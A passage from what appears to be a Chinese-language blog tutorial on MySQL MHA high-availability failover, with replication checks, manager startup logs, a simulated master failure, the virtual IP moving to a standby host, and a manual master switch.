22:54:12 2022 - [info] All SSH connection tests passed successfully.</span><br><span class="line">Fri May  6 22:54:12 2022 - [info] Checking MHA Node version..</span><br><span class="line">Fri May  6 22:54:14 2022 - [info]  Version check ok.</span><br><span class="line">Fri May  6 22:54:14 2022 - [info] Checking SSH publickey authentication settings on the current master..</span><br><span class="line">Fri May  6 22:54:14 2022 - [info] HealthCheck: SSH to 192.168.73.21 is reachable.</span><br><span class="line">Fri May  6 22:54:15 2022 - [info] Master MHA Node version is 0.54.</span><br><span class="line">Fri May  6 22:54:15 2022 - [info] Checking recovery script configurations on the current master..</span><br><span class="line">Fri May  6 22:54:15 2022 - [info]   Executing command: save_binary_logs --command=test --start_pos=4 --binlog_dir=/var/lib/mysql --output_file=/tmp/save_binary_logs_test --manager_version=0.54 --start_file=mysql-bin-master.000002</span><br><span class="line">Fri May  6 22:54:15 2022 - [info]   Connecting to root@192.168.73.21(192.168.73.21)..</span><br><span class="line">  Creating /tmp if not exists..    ok.</span><br><span class="line">  Checking output directory is accessible or not..</span><br><span class="line">   ok.</span><br><span class="line">  Binlog found at /var/lib/mysql, up to mysql-bin-master.000002</span><br><span class="line">Fri May  6 22:54:15 2022 - [info] Master setting check done.</span><br><span class="line">Fri May  6 22:54:15 2022 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..</span><br><span class="line">Fri May  6 22:54:15 2022 - [info]   Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=192.168.73.22 --slave_ip=192.168.73.22 --slave_port=3306 --workdir=/tmp --target_version=5.7.24-log --manager_version=0.54 --relay_log_info=/var/lib/mysql/relay-log.info  --relay_dir=/var/lib/mysql/  --slave_pass=xxx</span><br><span class="line">Fri May  6 22:54:15 2022 - [info]   Connecting to root@192.168.73.22(192.168.73.22:22)..</span><br><span class="line">  Checking slave recovery environment settings..</span><br><span class="line">    Opening /var/lib/mysql/relay-log.info ... ok.</span><br><span class="line">    Relay log found at /var/lib/mysql, up to rhel_sqlsrv-relay-bin.000003</span><br><span class="line">    Temporary relay log file is /var/lib/mysql/rhel_sqlsrv-relay-bin.000003</span><br><span class="line">    Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line"> done.</span><br><span class="line">    Testing mysqlbinlog output.. done.</span><br><span class="line">    Cleaning up test file(s).. done.</span><br><span class="line">Fri May  6 22:54:26 2022 - [info]   Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=192.168.73.23 --slave_ip=192.168.73.23 --slave_port=3306 --workdir=/tmp --target_version=5.7.24-log --manager_version=0.54 --relay_log_info=/var/lib/mysql/relay-log.info  --relay_dir=/var/lib/mysql/  --slave_pass=xxx</span><br><span class="line">Fri May  6 22:54:26 2022 - [info]   Connecting to root@192.168.73.23(192.168.73.23:22)..</span><br><span class="line">  Checking slave recovery environment settings..</span><br><span class="line">    Opening /var/lib/mysql/relay-log.info ... ok.</span><br><span class="line">    Relay log found at /var/lib/mysql, up to ctos_sqlsrv-relay-bin.000011</span><br><span class="line">    Temporary relay log file is /var/lib/mysql/ctos_sqlsrv-relay-bin.000011</span><br><span class="line">    Testing mysql connection and privileges..mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line"> done.</span><br><span class="line">    Testing mysqlbinlog output.. done.</span><br><span class="line">    Cleaning up test file(s).. done.</span><br><span class="line">Fri May  6 22:54:37 2022 - [info] Slaves settings check done.</span><br><span class="line">Fri May  6 22:54:37 2022 - [info]</span><br><span class="line">192.168.73.21 (current master)</span><br><span class="line"> +--192.168.73.22</span><br><span class="line"> +--192.168.73.23</span><br><span class="line"></span><br><span class="line">Fri May  6 22:54:37 2022 - [info] Checking replication health on 192.168.73.22..</span><br><span class="line">Fri May  6 22:54:37 2022 - [info]  ok.</span><br><span class="line">Fri May  6 22:54:37 2022 - [info] Checking replication health on 192.168.73.23..</span><br><span class="line">Fri May  6 22:54:37 2022 - [info]  ok.</span><br><span class="line">Fri May  6 22:54:37 2022 - [info] Checking master_ip_failover_script status:</span><br><span class="line">Fri May  6 22:54:37 2022 - [info]   /usr/local/bin/master_ip_failover --command=status --ssh_user=root --orig_master_host=192.168.73.21 --orig_master_ip=192.168.73.21 --orig_master_port=3306</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IN SCRIPT TEST====/usr/sbin/ip addr del 192.168.73.73/24 dev ens33 label ens33:1==/usr/sbin/ip addr add 192.168.73.73/24 brd 192.168.73.255 dev ens33 label ens33:1;/usr/sbin/arping -q -A -c 1 -I ens33:1 192.168.73.73;iptables -F;===</span><br><span class="line"></span><br><span class="line">Checking the Status of the script.. OK</span><br><span class="line">Fri May  6 22:54:37 2022 - [info]  OK.</span><br><span class="line">Fri May  6 22:54:37 2022 - [warning] shutdown_script is not defined.</span><br><span class="line">Fri May  6 22:54:37 2022 - [info] Got exit code 0 (Not master dead).</span><br><span class="line"></span><br><span class="line">MySQL Replication Health is OK.</span><br></pre></td></tr></tbody></table></figure><p><code>MySQL Replication Health is NOT OK!</code> &#x5982;&#x679C;&#x63D0;&#x793A;&#x8FD9;&#x4E2A;&#x4E0D;OK&#xFF0C;&#x8BF4;&#x660E;&#x6709;&#x95EE;&#x9898;&#x3002;&#xFF08;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x53C2;&#x8003;&#x6700;&#x540E;&#x7AE0;&#x8282;&#xFF09;<br><code>MySQL Replication Health is OK.</code>&#x663E;&#x793A;Ok &#xFF0C;&#x6B63;&#x5E38;&#xFF01;</p><p>&#x53C2;&#x6570;&#x8C03;&#x8BD5;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/mysql57/bin/mysqlbinlog /usr/local/bin/mysqlbinlog</span><br><span class="line">ln -s /usr/local/mysql57/bin/mysql /usr/local/bin/mysql</span><br><span class="line">[root@ctos7mini ~]&amp; grep master_ip_failover /etc/masterha/app1.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash">master_ip_failover_script= /usr/<span class="built_in">local</span>/bin/master_ip_failover</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#xFF08;5&#xFF09;&#x68C0;&#x67E5;MHA Manager&#x7684;&#x72B6;&#x6001;&#xFF1A;</strong></p><p>&#x901A;&#x8FC7;master_check_status&#x811A;&#x672C;&#x67E5;&#x770B;Manager&#x7684;&#x72B6;&#x6001;&#xFF1A;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; masterha_check_status --conf=/etc/masterha/app1.cnf</span><br><span class="line">app1 is stopped(2:NOT_RUNNING).</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p>&#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C;&#x6B63;&#x5E38;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x201D;PING_OK&#x201D;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x663E;&#x793A;&#x201D;NOT_RUNNING&#x201D;&#xFF0C;&#x8FD9;&#x4EE3;&#x8868;MHA&#x76D1;&#x63A7;&#x6CA1;&#x6709;&#x5F00;&#x542F;</p><p><strong>&#xFF08;6&#xFF09;&#x5F00;&#x542F;MHA Manager&#x76D1;&#x63A7;</strong></p><pre><code>nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp;</code></pre><p>&#x542F;&#x52A8;&#x53C2;&#x6570;&#x4ECB;&#x7ECD;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--remove_dead_master_conf&#xA0;&#xA0;&#xA0; &#x8BE5;&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5F53;&#x53D1;&#x751F;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x8001;&#x7684;&#x4E3B;&#x5E93;&#x7684;ip&#x5C06;&#x4F1A;&#x4ECE;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x79FB;&#x9664;</span><br><span class="line">--manger_log&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#x65E5;&#x5FD7;&#x5B58;&#x653E;&#x4F4D;&#x7F6E;</span><br><span class="line">--ignore_last_failover&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#x5728;&#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;MHA&#x68C0;&#x6D4B;&#x5230;&#x8FDE;&#x7EED;&#x53D1;&#x751F;&#x5B95;&#x673A;&#xFF0C;&#x4E14;&#x4E24;&#x6B21;&#x5B95;&#x673A;&#x95F4;&#x9694;&#x4E0D;&#x8DB3;8&#x5C0F;&#x65F6;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;Failover&#xFF0C;&#x4E4B;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x9650;&#x5236;&#x662F;&#x4E3A;&#x4E86;&#x907F;&#x514D;ping-pong&#x6548;&#x5E94;&#x3002;&#x8BE5;&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5FFD;&#x7565;&#x4E0A;&#x6B21;MHA&#x89E6;&#x53D1;&#x5207;&#x6362;&#x4EA7;&#x751F;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MHA&#x53D1;&#x751F;&#x5207;&#x6362;&#x540E;&#x4F1A;&#x5728;&#x65E5;&#x5FD7;&#x76EE;&#x5F55;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E0A;&#x9762;&#x6211;&#x8BBE;&#x7F6E;&#x7684;/data&#x4EA7;&#x751F;app1.failover.complete&#x6587;&#x4EF6;&#xFF0C;&#x4E0B;&#x6B21;&#x518D;&#x6B21;&#x5207;&#x6362;&#x7684;&#x65F6;&#x5019;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x5C06;&#x4E0D;&#x5141;&#x8BB8;&#x89E6;&#x53D1;&#x5207;&#x6362;&#xFF0C;&#x9664;&#x975E;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5207;&#x6362;&#x540E;&#x6536;&#x5230;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#xFF0C;&#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;&#x4E3A;--ignore_last_failover</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7EE7;&#x7EED;&#x68C0;&#x67E5;MHA Manager&#x76D1;&#x63A7;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF1A;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; masterha_check_status --conf=/etc/masterha/app1.cnf</span><br><span class="line">app1 (pid:2803) is running(0:PING_OK), master:192.168.73.21</span><br><span class="line">[6]-  Exit 1                  nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1</span><br><span class="line">[7]+  Exit 1                  nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1</span><br><span class="line">[root@ctos7mini ~]&amp; jobs</span><br><span class="line">[1]+  Running                 nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp;</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x770B;&#x89C1;&#x5DF2;&#x7ECF;&#x5728;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x800C;&#x4E14;master&#x7684;&#x4E3B;&#x673A;&#x4E3A;192.168.73.21</p><p><strong>&#xFF08;7&#xFF09;&#x67E5;&#x770B;&#x542F;&#x52A8;&#x65E5;&#x5FD7;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; tail -n 10 /var/log/masterha/app1/manager.log</span><br><span class="line">Fri May  6 23:16:28 2022 - [info]  OK.</span><br><span class="line">Fri May  6 23:16:28 2022 - [warning] shutdown_script is not defined.</span><br><span class="line">Fri May  6 23:16:28 2022 - [info] Set master ping interval 1 seconds.</span><br><span class="line">Fri May  6 23:16:28 2022 - [warning] secondary_check_script is not defined. It is highly recommended setting it to check master reachability from two or more routes.</span><br><span class="line">Fri May  6 23:16:28 2022 - [info] Starting ping health check on 192.168.73.21(192.168.73.21:3306)..</span><br><span class="line">Fri May  6 23:16:32 2022 - [warning] Got error when monitoring master:  at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 446.</span><br><span class="line">Fri May  6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln448] Target master&apos;s advisory lock is already held by someone. Please check whether you monitor the same master from multiple monitoring processes.</span><br><span class="line">Fri May  6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln468] Error happened on health checking.  at /usr/bin/masterha_manager line 50.</span><br><span class="line">Fri May  6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.</span><br><span class="line">Fri May  6 23:16:32 2022 - [info] Got exit code 1 (Not master dead).</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6E05;&#x7A7A;&#x65E5;&#x5FD7;&#xFF0C;&#x7136;&#x540E;&#x5173;&#x95ED;&#x76D1;&#x63A7;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; echo &gt; /var/log/masterha/app1/manager.log</span><br><span class="line"></span><br><span class="line">[root@ctos7mini ~]&amp; masterha_stop --conf=/etc/masterha/app1.cnf</span><br><span class="line">Stopped app1 successfully.</span><br><span class="line">[1]+  Exit 1                  nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7EE7;&#x7EED;&#x5F00;&#x542F;&#x76D1;&#x63A7;</p><pre><code>nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp;</code></pre><p>&#x89C2;&#x770B;&#x65E5;&#x5FD7;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; tail -n 10 /var/log/masterha/app1/manager.log</span><br><span class="line"></span><br><span class="line">IN SCRIPT TEST====/usr/sbin/ip addr del 192.168.73.73/24 dev ens33 label ens33:1==/usr/sbin/ip addr add 192.168.73.73/24 brd 192.168.73.255 dev ens33 label ens33:1;/usr/sbin/arping -q -A -c 1 -I ens33:1 192.168.73.73;iptables -F;===</span><br><span class="line"></span><br><span class="line">Checking the Status of the script.. OK</span><br><span class="line">Fri May  6 23:30:53 2022 - [info]  OK.</span><br><span class="line">Fri May  6 23:30:53 2022 - [warning] shutdown_script is not defined.</span><br><span class="line">Fri May  6 23:30:53 2022 - [info] Set master ping interval 1 seconds.</span><br><span class="line">Fri May  6 23:30:53 2022 - [warning] secondary_check_script is not defined. It is highly recommended setting it to check master reachability from two or more routes.</span><br><span class="line">Fri May  6 23:30:53 2022 - [info] Starting ping health check on 192.168.73.21(192.168.73.21:3306)..</span><br><span class="line">Fri May  6 23:30:53 2022 - [info] Ping(SELECT) succeeded, waiting until MySQL doesn&apos;t respond..</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;<code>Ping(SELECT) succeeded, waiting until MySQL doesn&apos;t respond..</code>&#x8BF4;&#x660E;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x5DF2;&#x7ECF;&#x5F00;&#x59CB;&#x76D1;&#x63A7;&#x4E86;</p><p><strong>&#xFF08;9&#xFF09;&#x6A21;&#x62DF;&#x6545;&#x969C;</strong></p><p>&#x505C;&#x6389;MySQL&#x4E3B;&#x5E93;</p><pre><code>[root@rhel7 ~]# systemctl stop mysqld</code></pre><p>&#x67E5;&#x770B;&#x65E5;&#x5FD7;&#xFF0C;&#x89C2;&#x5BDF;&#x96C6;&#x7FA4;&#x72B6;&#x51B5;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; tail -n 20 /var/log/masterha/app1/manager.log</span><br><span class="line"></span><br><span class="line">----- Failover Report -----</span><br><span class="line"></span><br><span class="line">app1: MySQL Master failover 192.168.73.21 to 192.168.73.22 succeeded</span><br><span class="line"></span><br><span class="line">Master 192.168.73.21 is down!</span><br><span class="line"></span><br><span class="line">Check MHA Manager logs at ctos7mini:/var/log/masterha/app1/manager.log for details.</span><br><span class="line"></span><br><span class="line">Started automated(non-interactive) failover.</span><br><span class="line">Invalidated master IP address on 192.168.73.21.</span><br><span class="line">The latest slave 192.168.73.22(192.168.73.22:3306) has all relay logs for recovery.</span><br><span class="line">Selected 192.168.73.22 as a new master.</span><br><span class="line">192.168.73.22: OK: Applying all logs succeeded.</span><br><span class="line">192.168.73.22: OK: Activated master IP address.</span><br><span class="line">192.168.73.23: This host has the latest relay log events.</span><br><span class="line">Generating relay diff files from the latest slave succeeded.</span><br><span class="line">192.168.73.23: OK: Applying all logs succeeded. Slave started, replicating from 192.168.73.22.</span><br><span class="line">192.168.73.22: Resetting slave info succeeded.</span><br><span class="line">Master failover to 192.168.73.22(192.168.73.22:3306) completed successfully.</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x67E5;&#x770B;192.168.73.22&#x7684;slave&#x72B6;&#x6001;&#xFF1A;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x67E5;&#x770B;192.168.73.23&#x7684;slave&#x72B6;&#x6001;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 192.168.73.22</span><br><span class="line">                  Master_User: slave</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-slave2.000002</span><br><span class="line">          Read_Master_Log_Pos: 1048</span><br><span class="line">               Relay_Log_File: ctos_sqlsrv-relay-bin.000002</span><br><span class="line">                Relay_Log_Pos: 323</span><br><span class="line">        Relay_Master_Log_File: mysql-slave2.000002</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB:</span><br><span class="line">.................................................&#x7701;&#x7565;.......................................................</span><br><span class="line">             Master_Server_Id: 3</span><br><span class="line">                  Master_UUID: 90e5e492-cd2d-11ec-88d4-000c299254eb</span><br><span class="line">             Master_Info_File: /var/lib/mysql/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind:</span><br><span class="line">.................................................&#x7701;&#x7565;.......................................................</span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E3B;&#x5E93;&#x53D8;&#x6210;&#x4E86;192.168.73.22&#xFF01;</p><p>&#x67E5;&#x770B;&#x5907;&#x7528;&#x4E3B;&#x5E93;&#x7684;IP&#x5730;&#x5740;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos_sqlsrv ~]&amp; ip addr show dev ens33</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    link/ether 00:0c:29:27:5c:d4 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.73.23/24 brd 192.168.73.255 scope global ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 192.168.73.73/24 brd 192.168.73.255 scope global secondary ens33:1</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::412f:a64f:e2ff:e154/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@ctos_sqlsrv ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><p>ip&#x6F02;&#x79FB;&#x5230;&#x4E86;&#x5907;&#x7528;master&#x4E0A;</p><p>&#x5F00;&#x542F;down&#x6389;&#x7684;master&#xFF0C;&#x624B;&#x52A8;&#x8FDB;&#x884C;&#x5207;&#x6362;&#x4E3B;&#x5E93;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"> [root@ctos7mini ~]&amp; masterha_master_switch --conf=/etc/masterha/app1.cnf --master_state=alive --new_master_host=192.168.73.21 --new_master_port=3306 --orig_master_is_new_slave --running_updates_limit=10000</span><br><span class="line">Sat May  7 03:08:13 2022 - [info] MHA::MasterRotate version 0.54.</span><br><span class="line">Sat May  7 03:08:13 2022 - [info] Starting online master switch..</span><br><span class="line">Sat May  7 03:08:13 2022 - [info]</span><br><span class="line">Sat May  7 03:08:13 2022 - [info] * Phase 1: Configuration Check Phase..</span><br><span class="line">Sat May  7 03:08:13 2022 - [info]</span><br><span class="line">Sat May  7 03:08:13 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.</span><br><span class="line">Sat May  7 03:08:13 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Sat May  7 03:08:13 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..</span><br><span class="line">Sat May  7 03:08:14 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Sat May  7 03:08:14 2022 - [info] Alive Slaves:</span><br><span class="line">Sat May  7 03:08:14 2022 - [info]   192.168.73.22(192.168.73.22:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabled</span><br><span class="line">Sat May  7 03:08:14 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)</span><br><span class="line">Sat May  7 03:08:14 2022 - [info]     Primary candidate for the new Master (candidate_master is set)</span><br><span class="line">Sat May  7 03:08:14 2022 - [info]   192.168.73.23(192.168.73.23:3306)  Version=5.7.24-log (oldest major version between slaves) log-bin:enabled</span><br><span class="line">Sat May  7 03:08:14 2022 - [info]     Replicating from 192.168.73.21(192.168.73.21:3306)</span><br><span class="line"></span><br><span class="line">It is better to execute FLUSH NO_WRITE_TO_BINLOG TABLES on the master before switching. Is it ok to execute on 192.168.73.21(192.168.73.21:3306)? (YES/no): yes</span><br><span class="line">Sat May  7 03:08:17 2022 - [info] Executing FLUSH NO_WRITE_TO_BINLOG TABLES. This may take long time..</span><br><span class="line">Sat May  7 03:08:17 2022 - [info]  ok.</span><br><span class="line">Sat May  7 03:08:17 2022 - [info] Checking MHA is not monitoring or doing failover..</span><br><span class="line">Sat May  7 03:08:17 2022 - [info] Checking replication health on 192.168.73.22..</span><br><span class="line">Sat May  7 03:08:17 2022 - [info]  ok.</span><br><span class="line">Sat May  7 03:08:17 2022 - [info] Checking replication health on 192.168.73.23..</span><br><span class="line">Sat May  7 03:08:17 2022 - [info]  ok.</span><br><span class="line">Sat May  7 03:08:17 2022 - [info] 192.168.73.21 can be new master.</span><br><span class="line">Sat May  7 03:08:17 2022 - [info]</span><br><span class="line">From:</span><br><span class="line">192.168.73.21 (current master)</span><br><span class="line"> +--192.168.73.22</span><br><span class="line"> +--192.168.73.23</span><br><span class="line"></span><br><span class="line">To:</span><br><span class="line">192.168.73.21 (new master)</span><br><span class="line"> +--192.168.73.22</span><br><span class="line"> +--192.168.73.23</span><br><span class="line"> +--192.168.73.21</span><br><span class="line"></span><br><span class="line">Starting master switch from 192.168.73.21(192.168.73.21:3306) to 192.168.73.21(192.168.73.21:3306)? (yes/NO): yes</span><br><span class="line">Sat May  7 03:08:19 2022 - [info] Checking whether 192.168.73.21(192.168.73.21:3306) is ok for the new master..</span><br><span class="line">Sat May  7 03:08:19 2022 - [info]  ok.</span><br><span 